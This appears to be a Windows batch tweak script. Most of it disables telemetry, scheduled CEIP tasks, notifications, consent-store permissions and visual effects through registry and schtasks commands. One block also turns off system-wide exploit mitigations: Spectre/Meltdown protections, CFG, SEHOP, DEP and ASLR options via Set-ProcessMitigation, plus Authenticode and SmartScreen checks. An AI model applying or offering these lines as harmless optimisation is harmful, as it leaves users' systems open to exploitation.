reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d 00000001 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d 00000000 /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\activity" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\cellularData" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\cellularData\Microsoft.Win32WebViewHost_cw5n1h2txyewy" /v "Value" /t REG_SZ /d "Allow" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\gazeInput" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location\Microsoft.Win32WebViewHost_cw5n1h2txyewy" /v "Value" /t REG_SZ /d "Prompt" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCall" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation\Microsoft.AccountsControl_cw5n1h2txyewy" /v "Value" /t REG_SZ /d "Prompt" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v "Value" /t REG_SZ /d "Allow" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\Microsoft.Win32WebViewHost_cw5n1h2txyewy" /v "Value" /t REG_SZ /d "Allow" /f
cls
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /disable
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater"
schtasks /change /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable
schtasks /end /tn "\Microsoft\Windows\Application Experience\StartupAppTask"
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh" /disable
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyUpload"
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyUpload" /disable
schtasks /end /tn "\Microsoft\Windows\Maintenance\WinSAT"
cls
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\QuietHours" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.AutoPlay" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.LowDisk" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.Print.Notification" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WiFiNetworkManager" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds" /v "EnableFeeds" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft" /v "AllowNewsAndInterests" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "1" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\System\AllowExperimentation" /v "value" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\AppSync" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\DesktopTheme" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\PackageState" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\StartLayout" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "DoReport" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "LoggingDisabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\PCHealth\ErrorReporting" /v "DoReport" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-310093Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-314563Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338387Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353698Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "JPEGImportQuality" /t REG_DWORD /d "256" /f
reg add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseActionCenterExperience" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\EnhancedStorageDevices" /v "TCGSecurityActivationDisabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
cls
PowerShell.exe -ExecutionPolicy Unrestricted -Command "$serviceName = 'WMPNetworkSvc'; Write-Host "^""Disabling service: `"^""$serviceName`"^""."^""; <# -- 1. Skip if service does not exist #>; $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue; if(!$service) {; Write-Host "^""Service `"^""$serviceName`"^"" could not be not found, no need to disable it."^""; Exit 0; }; <# -- 2. Stop if running #>; if ($service.Status -eq [System.ServiceProcess.ServiceControllerStatus]::Running) {; Write-Host "^""`"^""$serviceName`"^"" is running, stopping it."^""; try {; Stop-Service -Name "^""$serviceName"^"" -Force -ErrorAction Stop; Write-Host "^""Stopped `"^""$serviceName`"^"" successfully."^""; } catch {; Write-Warning "^""Could not stop `"^""$serviceName`"^"", it will be stopped after reboot: $_"^""; }; } else {; Write-Host "^""`"^""$serviceName`"^"" is not running, no need to stop."^""; }; <# -- 3. Skip if already disabled #>; $startupType = $service.StartType <# Does not work before .NET 4.6.1 #>; if(!$startupType) {; $startupType = (Get-WmiObject -Query "^""Select StartMode From Win32_Service Where Name='$serviceName'"^"" -ErrorAction Ignore).StartMode; if(!$startupType) {; $startupType = (Get-WmiObject -Class Win32_Service -Property StartMode -Filter "^""Name='$serviceName'"^"" -ErrorAction Ignore).StartMode; }; }; if($startupType -eq 'Disabled') {; Write-Host "^""$serviceName is already disabled, no further action is needed"^""; }; <# -- 4. Disable service #>; try {; Set-Service -Name "^""$serviceName"^"" -StartupType Disabled -Confirm:$false -ErrorAction Stop; Write-Host "^""Disabled `"^""$serviceName`"^"" successfully."^""; } catch {; Write-Error "^""Could not disable `"^""$serviceName`"^"": $_"^""; }"
FOR /F "eol=E" %%a in ('REG QUERY "HKLM\SYSTEM\CurrentControlSet\Services" /S /F "IoLatencyCap"^| FINDSTR /V "IoLatencyCap"') DO (
	REG ADD "%%a" /F /V "IoLatencyCap" /T REG_DWORD /d 0 >NUL 2>&1

	FOR /F "tokens=*" %%z IN ("%%a") DO (
		SET STR=%%z
		SET STR=!STR:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\=!
		SET STR=!STR:\Parameters=!
	)
)
FOR /F "eol=E" %%a in ('REG QUERY "HKLM\SYSTEM\CurrentControlSet\Services" /S /F "EnableHIPM"^| FINDSTR /V "EnableHIPM"') DO (
	REG ADD "%%a" /F /V "EnableHIPM" /T REG_DWORD /d 0 >NUL 2>&1
	REG ADD "%%a" /F /V "EnableDIPM" /T REG_DWORD /d 0 >NUL 2>&1
	REG ADD "%%a" /F /V "EnableHDDParking" /T REG_DWORD /d 0 >NUL 2>&1

	FOR /F "tokens=*" %%z IN ("%%a") DO (
		SET STR=%%z
		SET STR=!STR:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\=!
	)
)
for /f "tokens=*" %%s in ('reg query "HKLM\System\CurrentControlSet\Enum" /S /F "StorPort" ^| findstr /e "StorPort"') do Reg add "%%s" /v "EnableIdlePowerManagement" /t REG_DWORD /d "0" /f





PowerShell.exe set-ProcessMitigation -System -Disable  DEP, EmulateAtlThunks, SEHOP, ForceRelocateImages, RequireInfo, BottomUp, HighEntropy, StrictHandle, DisableWin32kSystemCalls, AuditSystemCall, DisableExtensionPoints, BlockDynamicCode, AllowThreadsToOptOut, AuditDynamicCode, CFG, SuppressExports, StrictCFG, MicrosoftSignedOnly, AllowStoreSignedBinaries, AuditMicrosoftSigned, AuditStoreSigned, EnforceModuleDependencySigning, DisableNonSystemFonts, AuditFont, BlockRemoteImageLoads, BlockLowLabelImageLoads, PreferSystem32, AuditRemoteImageLoads, AuditLowLabelImageLoads, AuditPreferSystem32, EnableExportAddressFilter, AuditEnableExportAddressFilter, EnableExportAddressFilterPlus, AuditEnableExportAddressFilterPlus, EnableImportAddressFilter, AuditEnableImportAddressFilter, EnableRopStackPivot, AuditEnableRopStackPivot, EnableRopCallerCheck, AuditEnableRopCallerCheck, EnableRopSimExec, AuditEnableRopSimExec, SEHOP, AuditSEHOP, SEHOPTelemetry, TerminateOnError, DisallowChildProcessCreation, AuditChildProcess
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 00000000 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DontPrettyPath" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInstrumentation" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "4000" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "5000" /f
reg add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
reg add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "5000" /f
reg add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "5000" /f
reg add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
reg add "HKCU\Control Panel\Desktop" /v "MouseWheelRouting" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing" /v "DefaultApplied" /t REG_SZ /d "1" /f
